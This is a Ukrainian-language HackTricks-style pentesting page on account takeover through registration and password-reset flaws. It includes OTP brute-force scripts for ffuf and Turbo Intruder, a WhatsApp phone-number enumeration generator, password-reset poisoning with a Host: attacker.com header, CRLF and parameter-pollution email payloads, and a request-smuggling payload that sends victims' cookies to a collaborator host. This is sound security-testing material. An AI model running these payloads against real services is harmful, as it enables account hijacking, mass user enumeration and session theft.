# Вразливості реєстрації та захоплення облікових записів

{{#include ../banners/hacktricks-training.md}}

## Захоплення облікового запису через реєстрацію

### Повторна реєстрація

- Спробуйте створити акаунт з вже існуючим username
- Перевірте варіації email:
- використати великі літери
- +1@
- додати крапку в імені email
- спеціальні символи в імені пошти (%00, %09, %20)
- Додайте пробільні символи після email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Спробуйте трюки канонізації поштових провайдерів (залежить від сервісу):
- Gmail ігнорує крапки та subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` доставляються на `victim@gmail.com`
- Деякі провайдери нечутливі до регістру в локальній частині адреси
- Деякі провайдери приймають unicode confusables. Спробуйте гомогліфи та soft hyphen `\u00AD` у локальній частині
- Зловживання цим дозволяє: обходити перевірки унікальності, отримувати дубльовані акаунти/запрошення в робочі простори, або блокувати реєстрації жертви (тимчасовий DoS) поки ви готуєте захоплення

### Username Enumeration

Перевірте, чи можна визначити, чи username вже зареєстрований у застосунку.

- Різні повідомлення про помилки або HTTP status codes
- Відмінності в таймінгу (існуючий користувач може викликати запит до IdP/DB)
- Автозаповнення профілю у формі реєстрації для відомих email
- Перевірте team/invite flows: введення email може показувати, чи існує акаунт

### Password Policy

При створенні користувача перевірте політику паролів (чи можна використати слабкі паролі).\
У такому випадку можна спробувати bruteforce credentials.

### SQL Injection

[**Перегляньте цю сторінку** ](sql-injection/index.html#insert-statement)щоб дізнатися, як намагатися захопити акаунти або витягувати інформацію через **SQL Injections** у формах реєстрації.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Зміна електронної пошти

Після реєстрації спробуйте змінити email і перевірте, чи ця зміна правильно валідована або чи можна змінити його на довільну адресу.

### Додаткові перевірки

- Перевірте, чи можна використовувати **disposable emails** (mailinator, yopmail, 1secmail тощо) або обійти блоклист через subaddressing, наприклад `victim+mailinator@gmail.com`
- **Довгий** **пароль** (>200) може призвести до **DoS**
- **Перевірте rate limits при створенні акаунтів**
- Використайте username@**burp_collab**.net і проаналізуйте **callback**
- Якщо використовується верифікація номера телефону, перевірте крайові випадки парсингу/інжекцій телефонів

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Месенджери, що орієнтовані на номери телефонів, розкривають **presence oracle** щоразу, коли клієнт синхронізує контакти. Повторне відтворення запитів discovery WhatsApp історично давало **>100M запитів на годину**, що дозволяло майже повне перерахування акаунтів.

**Сценарій атаки**

1. **Інструментуйте офіційний клієнт**, щоб захопити запит на завантаження адресної книги (аутентифікований blob нормалізованих номерів у форматі E.164). Відтворюйте його з номерами, згенерованими атакуючим, повторно використовуючи ті самі cookies/device token.
2. **Групуйте номери в одному запиті**: WhatsApp приймає тисячі ідентифікаторів і повертає registered/unregistered плюс метадані (business, companion тощо). Аналізуйте відповіді офлайн, щоб будувати списки цілей без відправлення повідомлень жертвам.
3. **Горизонтально масштабируйте** перерахування за допомогою SIM banks, cloud devices або residential proxies, щоб не спрацьовували обмеження по акаунту/IP/ASN.

**Моделювання плану набору номерів**

Моделюйте план набору кожної країни, щоб пропускати недійсні кандидати. NDSS dataset (`country-table.*`) містить коди країн, щільність прийняття та розподіл платформ, тож ви можете пріоритизувати діапазони з високим шансом попадання. Приклад seed-коду:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Пріоритезуйте префікси, що відповідають реальним розподілам (Mobile Country Code + National Destination Code) перед тим, як опитувати oracle, щоб зберегти корисну пропускну здатність.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Slice censuses by country/OS/app type to find regions with weak SMS filtering or heavy WhatsApp Business adoption for localized social engineering.

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Слабка перевірка Email/Phone (OTP/Magic Link)

Потоки реєстрації часто підтверджують володіння через числовий OTP або magic-link token. Типові вади:

- Вгадуваний або короткий OTP (4–6 цифр) без ефективного rate limiting або IP/device tracking. Спробуйте паралельні вгадування та header/IP rotation.
- Повторне використання OTP між діями або обліковими записами, або відсутність прив'язки до конкретного користувача/дії (наприклад, той самий код працює для login і signup, або працює після зміни email).
- Multi-value smuggling: some backends accept multiple codes and verify if any matches. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguish wrong vs expired vs wrong-user codes by status/message/body length.
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Паралельне/одночасне вгадування для обходу послідовних блокувань (використовуйте Turbo Intruder in Burp):

<details>
<summary>Фрагмент Turbo Intruder для масового відправлення спроб 6‑digit OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Спробуйте racing verification: відправте той самий валідний OTP одночасно в двох сесіях; іноді одна сесія стає verified attacker account, тоді як victim flow також проходить успішно.
- Також тестуйте Host header poisoning на verification links (так само як reset poisoning нижче), щоб leak або завершити verification на attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Потужний клас проблем виникає, коли attacker виконує дії з victim’s email до того, як victim створить свій account, а потім відновлює доступ пізніше.

Ключові техніки для тестування (адаптуйте до потоків цілі):

- Classic–Federated Merge
- Attacker: реєструє classic account з victim email та встановлює пароль
- Victim: пізніше реєструється через SSO (той самий email)
- Небезпечні merges можуть залишити обидві сторони залогіненими або відновити доступ attacker
- Unexpired Session Identifier
- Attacker: створює account і тримає long‑lived session (не виходить)
- Victim: відновлює/встановлює пароль і починає використовувати account
- Перевірте, чи старі sessions залишаються дійсними після reset або ввімкнення MFA
- Trojan Identifier
- Attacker: додає secondary identifier до попередньо створеного account (phone, additional email, або лінкує attacker’s IdP)
- Victim: скидає пароль; attacker пізніше використовує trojan identifier для reset/login
- Unexpired Email Change
- Attacker: ініціює email‑change на attacker mail і затримує підтвердження
- Victim: відновлює account і починає ним користуватися
- Attacker: пізніше completes pending email‑change, щоб вкрасти account
- Non‑Verifying IdP
- Attacker: використовує IdP, який не перевіряє володіння email, щоб заявити `victim@…`
- Victim: реєструється через classic route
- Сервіс зливає accounts по email без перевірки `email_verified` або місцевої verification

Практичні поради

- Збирайте flows та endpoints з web/mobile bundles. Шукайте classic signup, SSO linking, email/phone change та password reset endpoints.
- Створіть реалістичну автоматизацію, щоб підтримувати sessions живими, поки ви тестуєте інші потоки.
- Для SSO‑тестів підніміть тестовий OIDC provider і видавайте токени з `email` claims для victim address та `email_verified=false`, щоб перевірити, чи RP довіряє unverified IdPs.
- Після будь‑якого password reset або email change перевірте, що:
  - всі інші sessions і tokens скасовані,
  - pending email/phone change можливості скасовані,
  - раніше linked IdPs/emails/phones повторно верифікуються.

Примітка: Розгорнута методологія і кейс‑стаді цих технік документовані в Microsoft’s pre‑hijacking research (див. References в кінці).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR в параметрах API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Атакуючий повинен увійти у свій обліковий запис і перейти до функції **Змінити пароль**.
2. Запустіть Burp Suite та перехопіть запит
3. Надішліть його до вкладки Repeater та змініть параметри : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Токен скидання пароля повинен генеруватися випадково та бути унікальним щоразу.\
Спробуйте визначити, чи токен експірірує або чи він завжди однаковий — в деяких випадках алгоритм генерації слабкий і його можна вгадати. Наступні змінні можуть використовуватися алгоритмом.

- Timestamp
- UserID
- Електронна пошта користувача
- Ім'я та прізвище
- Дата народження
- Криптографія
- Тільки числа
- Невелика послідовність токена ( символи між \[A-Z,a-z,0-9])
- Повторне використання токена
- Дата/строк закінчення дії токена

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Зареєструйтеся в системі з юзернеймом, ідентичним імені жертви, але з пробілами доданими перед і/або після імені. e.g: `"admin "`
2. Запросіть скидання пароля для вашого зловмисного юзернейму.
3. Використайте токен, надісланий на вашу пошту, і скиньте пароль жертви.
4. Увійдіть в обліковий запис жертви з новим паролем.

Платформа CTFd була вразлива до цієї атаки.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Знайдіть XSS у додатку або піддомені, якщо cookies scoped до батьківського домену : `*.domain.com`
2. Leak the current **sessions cookie**
3. Аутентифікуйтеся як користувач, використовуючи cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Використайте **smuggler** для визначення типу HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Сконструюйте запит, який перезапише `POST / HTTP/1.1` наступними даними:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` з метою відкрити редирект жертв на burpcollab та вкрасти їхні cookies\
3. Кінцевий запит може виглядати наступним чином
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Звіти на Hackerone про експлуатацію цієї вразливості\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Account Takeover via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Create a payload for the CSRF, e.g: “HTML form with auto submit for a password change”
2. Send the payload

### Account Takeover via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token може використовуватися для автентифікації користувача.

- Змініть JWT, підставивши інший User ID / Email
- Перевірте на наявність слабкого підпису JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Деякі signup handlers виконують upsert, коли наданий email вже існує. Якщо endpoint приймає мінімальне тіло з email і password і не вимагає перевірки власності, відправлення email жертви перезапише її password до автентифікації.

- Discovery: збирайте імена endpoint з bundled JS (або трафіку мобільного додатку), потім фузьте базові шляхи, такі як /parents/application/v4/admin/FUZZ використовуючи ffuf/dirsearch.
- Method hints: a GET returning messages like "Only POST request is allowed." often indicates the correct verb and that a JSON body is expected.
- Мінімальне тіло, спостережене на практиці:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Приклад PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Вплив: Full Account Takeover (ATO) без жодного reset token, OTP або email verification.

## Посилання

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
